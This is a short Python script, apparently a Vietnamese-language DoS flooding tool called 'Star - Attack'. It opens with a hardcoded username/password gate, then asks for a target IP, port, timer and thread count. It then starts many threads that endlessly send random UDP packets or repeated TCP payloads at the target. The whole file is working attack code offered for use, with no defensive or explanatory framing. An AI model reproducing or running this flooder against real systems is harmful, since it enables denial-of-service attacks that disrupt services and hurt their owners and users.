import random
import socket
import threading

attemps = 0

while attemps < 100:
    username = input(' Nhap User: ')
    password = input(' Nhap Passwords: ')

    if username == 'last' and password == 'warning':
        print('Chao Mung Den Voi Tool Cua Viet Tien !')
        break
    else:
        print(' Vui Long Check Lai Password ! ')
        attemps += 1
        continue


print("""
                 ________________________
                |                                             |
                |          Star - Attack            |
                |        Author: LAST_WARNING |
                |                                             |
                |                                             |
                |                                             |
                 \______________________/



""")
ip= str(input(" Taget IP :"))
port= int(input(" Port :"))
choice = str(input(" Viet Tien Co Dep Trai Khong) ?:(co/khong) "))
times= int(input(" Timer :"))
threads= int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Bat Dau Tan Cong !!!")
		except:
			print("[!] Het Timer !")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"  Bat Dau Tan Cong!!!")
		except:
			s.close()
			print("[*] Het Timer")
            
for y in range(threads):
	if choice == 'co':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
